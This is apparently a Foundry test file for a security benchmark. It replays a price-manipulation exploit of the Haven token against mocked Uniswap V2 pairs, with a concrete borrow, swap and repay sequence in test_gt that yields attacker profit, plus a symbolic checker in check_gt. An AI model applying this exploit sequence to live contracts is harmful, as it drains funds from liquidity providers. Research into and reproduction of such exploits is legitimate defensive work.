// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {Haven} from "./Haven.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract HavenTestBase is Test, BlockLoader {
    BUSD busd;
    WBNB wbnb;
    Haven haven;
    UniswapV2Pair pairbw;
    UniswapV2Pair pairbh;
    UniswapV2Pair pairhw;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address wbnbAddr;
    address havenAddr;
    address pairbwAddr;
    address pairbhAddr;
    address pairhwAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1700122469;
    uint112 reserve0pairhw = 3331507362369;
    uint112 reserve1pairhw = 223810638763555953;
    uint32 blockTimestampLastpairhw = 1699750650;
    uint256 kLastpairhw = 745214305680806953037151300954;
    uint256 price0CumulativeLastpairhw =
        63466081651979556960538942765857786727586834347;
    uint256 price1CumulativeLastpairhw = 2197078846438920423450590082356143583;
    uint112 reserve0pairbh = 22720894641402877684930;
    uint112 reserve1pairbh = 1189264752406833;
    uint32 blockTimestampLastpairbh = 1699750650;
    uint256 kLastpairbh = 26979265847021017917535613580267219362;
    uint256 price0CumulativeLastpairbh = 6324398918569296832149457331935415;
    uint256 price1CumulativeLastpairbh =
        24405953190223274391710015536138225719456354224653;
    uint112 reserve0pairbw = 10233587450172482970376130;
    uint112 reserve1pairbw = 40124051007585481120207;
    uint32 blockTimestampLastpairbw = 1700122469;
    uint256 kLastpairbw = 410565393296220854618132121970900440107408313393;
    uint256 price0CumulativeLastpairbw =
        1344053650599500870256605223204932844770;
    uint256 price1CumulativeLastpairbw =
        142677231331143643067664245564647580260912607;
    uint256 totalSupplyhaven = 21000000000000000;
    uint256 balanceOfhavenpairhw = 3331507362369;
    uint256 balanceOfhavenattacker = 0;
    uint256 balanceOfhavenhaven = 222039277025213;
    uint256 balanceOfhavenpairbw = 0;
    uint256 balanceOfhavenpairbh = 1189264752406833;
    uint256 totalSupplywbnb = 2385729235320603072779320;
    uint256 balanceOfwbnbpairhw = 223810638763555953;
    uint256 balanceOfwbnbattacker = 0;
    uint256 balanceOfwbnbhaven = 0;
    uint256 balanceOfwbnbpairbw = 40124051007585481120207;
    uint256 balanceOfwbnbpairbh = 0;
    uint256 totalSupplybusd = 3379997906401635332238361948;
    uint256 balanceOfbusdpairhw = 0;
    uint256 balanceOfbusdattacker = 0;
    uint256 balanceOfbusdhaven = 0;
    uint256 balanceOfbusdpairbw = 10233587450172482970376130;
    uint256 balanceOfbusdpairbh = 22720894641402877684930;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        haven = new Haven();
        havenAddr = address(haven);
        pairbw = new UniswapV2Pair(
            address(busd),
            address(wbnb),
            reserve0pairbw,
            reserve1pairbw,
            blockTimestampLastpairbw,
            kLastpairbw,
            price0CumulativeLastpairbw,
            price1CumulativeLastpairbw
        );
        pairbwAddr = address(pairbw);
        pairbh = new UniswapV2Pair(
            address(busd),
            address(haven),
            reserve0pairbh,
            reserve1pairbh,
            blockTimestampLastpairbh,
            kLastpairbh,
            price0CumulativeLastpairbh,
            price1CumulativeLastpairbh
        );
        pairbhAddr = address(pairbh);
        pairhw = new UniswapV2Pair(
            address(haven),
            address(wbnb),
            reserve0pairhw,
            reserve1pairhw,
            blockTimestampLastpairhw,
            kLastpairhw,
            price0CumulativeLastpairhw,
            price1CumulativeLastpairhw
        );
        pairhwAddr = address(pairhw);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pairbw),
            address(pairbh),
            address(pairhw)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        haven.transfer(address(haven), balanceOfhavenhaven);
        wbnb.transfer(address(pairbw), balanceOfwbnbpairbw);
        busd.transfer(address(pairbw), balanceOfbusdpairbw);
        busd.transfer(address(pairbh), balanceOfbusdpairbh);
        haven.transfer(address(pairbh), balanceOfhavenpairbh);
        wbnb.transfer(address(pairhw), balanceOfwbnbpairhw);
        haven.transfer(address(pairhw), balanceOfhavenpairhw);
        haven.afterDeploy(address(router), address(pairhw), address(wbnb));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(busd),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(busd),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(wbnb),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(wbnb),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("Haven Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(haven),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(haven),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(haven),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("Pairbw Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pairbw),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(pairbw),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(pairbw),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("Pairbh Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pairbh),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(pairbh),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(pairbh),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("Pairhw Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pairhw),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(pairhw),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(pairhw),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(haven),
            address(attacker),
            haven.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e6 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_haven_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        haven.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_haven_owner(uint256 amount) internal eurus {
        haven.transfer(owner, amount);
    }

    function swap_pairbw_attacker_busd_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pairbw), amount);
        pairbw.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pairbw_attacker_wbnb_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pairbw), amount);
        pairbw.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_pairbh_attacker_busd_haven(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pairbh), amount);
        pairbh.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pairbh_attacker_haven_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        haven.transfer(address(pairbh), amount);
        pairbh.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_pairhw_attacker_haven_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        haven.transfer(address(pairhw), amount);
        pairhw.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pairhw_attacker_wbnb_haven(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pairhw), amount);
        pairhw.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_pairhw_haven_haven_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        haven.transfer(address(pairbh), 0);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 0x6f05b59d3b20000);
        borrow_wbnb_owner(0x6f05b59d3b20000);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 1);
        emit log_named_uint("amt2", 1);
        swap_pairhw_haven_haven_wbnb(1, 1);
        printBalance("After step1 ");
        emit log_named_uint("amt3", 0xde0b6b3a764000);
        emit log_named_uint("amt4", 0x10d9e630e3b);
        swap_pairhw_attacker_wbnb_haven(0xde0b6b3a764000, 0x10d9e630e3b);
        printBalance("After step2 ");
        emit log_named_uint("amt5", 0xea7bb7545d);
        emit log_named_uint("amt6", 0xe54f93491895b800);
        swap_pairbh_attacker_haven_busd(0xea7bb7545d, 0xe54f93491895b800);
        printBalance("After step3 ");
        emit log_named_uint("amt7", 0xe54f93491895b800);
        emit log_named_uint("amt8", 0xe4fbc69449f200);
        swap_pairbw_attacker_busd_wbnb(0xe54f93491895b800, 0xe4fbc69449f200);
        printBalance("After step4 ");
        emit log_named_uint("amt9", (0x6f05b59d3b20000 * 1003) / 1000);
        payback_wbnb_owner((0x6f05b59d3b20000 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pairhw_haven_haven_wbnb(amt1, amt2);
        swap_pairhw_attacker_wbnb_haven(amt3, amt4);
        swap_pairbh_attacker_haven_busd(amt5, amt6);
        swap_pairbw_attacker_busd_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
